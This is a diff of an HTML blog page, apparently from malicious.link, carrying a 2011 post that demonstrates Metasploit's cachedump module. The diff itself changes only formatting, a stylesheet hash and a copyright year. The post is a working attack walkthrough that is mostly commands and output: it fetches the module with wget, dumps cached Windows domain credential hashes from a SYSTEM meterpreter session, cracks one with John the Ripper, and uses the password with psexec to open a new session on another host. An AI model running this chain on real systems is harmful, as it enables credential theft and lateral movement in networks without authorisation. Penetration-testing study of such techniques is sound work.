@@ -10,7 +10,7 @@
     content="Update: Cachedump has been added to the Metasploit trunk:
 https://dev.metasploit.com/redmine/projects/framework/repository/revisions/12946
 Pull it down:
-wget http://lab.mediaservice.net/code/cachedump.rb  put it here: /(metasploitdir)/modules/post/windows/gather
+wget http://lab.mediaservice.net/code/cachedump.rb put it here: /(metasploitdir)/modules/post/windows/gather
 Load up console and pwn something then (MAKE SURE YOU ARE SYSTEM):
 meterpreter &amp;gt; run post/windows/gather/cachedump [*] Executing module against WORKSTATION244 [*] Obtaining the boot key... [*] Trying &#39;XP&#39; style... [*] Getting PolSecretEncryptionKey... [*] XP compatible client [*] Lsa Key: 29249a6480f428cb6dacba2d30d5292c [*] Getting LK$KM... [*] Dumping cached credentials... Username : jdoe Hash : 592cdfbc3f1ef77ae95c75f851e37166 Last login : 2010-05-11 01:43:48 DNS Domain Name : CONTOSO." />
 <meta name="keywords" content="" />
@@ -32,7 +32,7 @@ meterpreter &amp;gt; run post/windows/gather/cachedump [*] Executing module agai
     type="text/css">
 
 
-<link rel="stylesheet" href="https://malicious.link/scss/main.min.099699ab246bf26f50616f7c9f00c79d46110459d1bd727b2d07d6fc09ece082.css">
+<link rel="stylesheet" href="https://malicious.link/scss/main.min.48be1f41dc1d94d27b5663b2b359c895efd7696597f656e57d8f6c0e126c0563.css">
 
 
 
@@ -46,24 +46,21 @@ meterpreter &amp;gt; run post/windows/gather/cachedump [*] Executing module agai
 <meta itemprop="description" content="Update: Cachedump has been added to the Metasploit trunk:
 https://dev.metasploit.com/redmine/projects/framework/repository/revisions/12946
 Pull it down:
-wget http://lab.mediaservice.net/code/cachedump.rb  put it here: /(metasploitdir)/modules/post/windows/gather
+wget http://lab.mediaservice.net/code/cachedump.rb put it here: /(metasploitdir)/modules/post/windows/gather
 Load up console and pwn something then (MAKE SURE YOU ARE SYSTEM):
 meterpreter &gt; run post/windows/gather/cachedump [*] Executing module against WORKSTATION244 [*] Obtaining the boot key... [*] Trying &#39;XP&#39; style... [*] Getting PolSecretEncryptionKey... [*] XP compatible client [*] Lsa Key: 29249a6480f428cb6dacba2d30d5292c [*] Getting LK$KM... [*] Dumping cached credentials... Username : jdoe Hash : 592cdfbc3f1ef77ae95c75f851e37166 Last login : 2010-05-11 01:43:48 DNS Domain Name : CONTOSO.">
-
-
 <meta itemprop="datePublished" content="2011-02-14T22:03:37&#43;00:00" />
 <meta itemprop="dateModified" content="2011-02-14T22:03:37&#43;00:00" />
 <meta itemprop="wordCount" content="427">
 
 
 
-<meta itemprop="keywords" content="" />
-<meta name="twitter:card" content="summary"/>
+<meta itemprop="keywords" content="" /><meta name="twitter:card" content="summary"/>
 <meta name="twitter:title" content="Cachedump for Meterpreter in action"/>
 <meta name="twitter:description" content="Update: Cachedump has been added to the Metasploit trunk:
 https://dev.metasploit.com/redmine/projects/framework/repository/revisions/12946
 Pull it down:
-wget http://lab.mediaservice.net/code/cachedump.rb  put it here: /(metasploitdir)/modules/post/windows/gather
+wget http://lab.mediaservice.net/code/cachedump.rb put it here: /(metasploitdir)/modules/post/windows/gather
 Load up console and pwn something then (MAKE SURE YOU ARE SYSTEM):
 meterpreter &gt; run post/windows/gather/cachedump [*] Executing module against WORKSTATION244 [*] Obtaining the boot key... [*] Trying &#39;XP&#39; style... [*] Getting PolSecretEncryptionKey... [*] XP compatible client [*] Lsa Key: 29249a6480f428cb6dacba2d30d5292c [*] Getting LK$KM... [*] Dumping cached credentials... Username : jdoe Hash : 592cdfbc3f1ef77ae95c75f851e37166 Last login : 2010-05-11 01:43:48 DNS Domain Name : CONTOSO."/>
 
@@ -140,18 +137,11 @@ meterpreter &gt; run post/windows/gather/cachedump [*] Executing module against 
 
             <div class="post-content">
                 <p><strong>Update</strong>: Cachedump has been added to the Metasploit trunk:</p>
-
 <p><a href="https://dev.metasploit.com/redmine/projects/framework/repository/revisions/12946">https://dev.metasploit.com/redmine/projects/framework/repository/revisions/12946</a></p>
-
 <p>Pull it down:</p>
-
 <pre><code>wget http://lab.mediaservice.net/code/cachedump.rb
-</code></pre>
-
-<p>put it here:  <code>/(metasploitdir)/modules/post/windows/gather</code></p>
-
+</code></pre><p>put it here:  <code>/(metasploitdir)/modules/post/windows/gather</code></p>
 <p>Load up console and pwn something then (MAKE SURE YOU ARE SYSTEM):</p>
-
 <pre><code>meterpreter &gt; run post/windows/gather/cachedump
 [*] Executing module against WORKSTATION244
 [*] Obtaining the boot key...
@@ -178,18 +168,12 @@ jdoe:592cdfbc3f1ef77ae95c75f851e37166:CONTOSO.CO:CONTOS
 
 [*] Hash are in MSCACHE format. (mscash)
 meterpreter &gt;
-</code></pre>
-
-<p>Crack it:</p>
-
+</code></pre><p>Crack it:</p>
 <pre><code>cat lab.dic | ./john --stdin lab.mscash --format=mscash --pot=lab.pot  
 Loaded 1 password hash (M$ Cache Hash [Generic 1x])  
 ASDqwe123  (jdoe)  
 guesses: 1  time: 0:00:00:00  c/s: 500  trying: ASDqwe123
-</code></pre>
-
-<p>Use it:</p>
-
+</code></pre><p>Use it:</p>
 <pre><code>meterpreter &gt; background  
 msf exploit(handler) &gt; route add 10.10.10.0 255.255.255.0 1  
 msf exploit(handler) &gt; use exploit/windows/smb/psexec  
@@ -254,9 +238,7 @@ msf exploit(psexec) &gt; exploit
 [*] Closing service handle...  
 [*] Deleting jSlxARUj.exe...  
 [*] Meterpreter session 2 opened (X.X.X.X:80 -&gt; X.X.X.X:54430) at Mon Feb 14 22:23:00 +0000 2011
-</code></pre>
-
-<p>Woot ;-)</p>
+</code></pre><p>Woot ;-)</p>
 
             </div>
         </article>
@@ -278,7 +260,7 @@ msf exploit(psexec) &gt; exploit
                 <footer class="footer">
     <div class="footer__inner">
         <div class="footer__content">
-            <span>&copy; 2019</span>
+            <span>&copy; 2020</span>
             
             <span></span>
             <span> <a href="https://malicious.link/posts/index.xml" target="_blank" title="rss"><svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 20 20" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-rss"><path d="M4 11a9 9 0 0 1 9 9"></path><path d="M4 4a16 16 0 0 1 16 16"></path><circle cx="5" cy="19" r="1"></circle></svg></a></span>
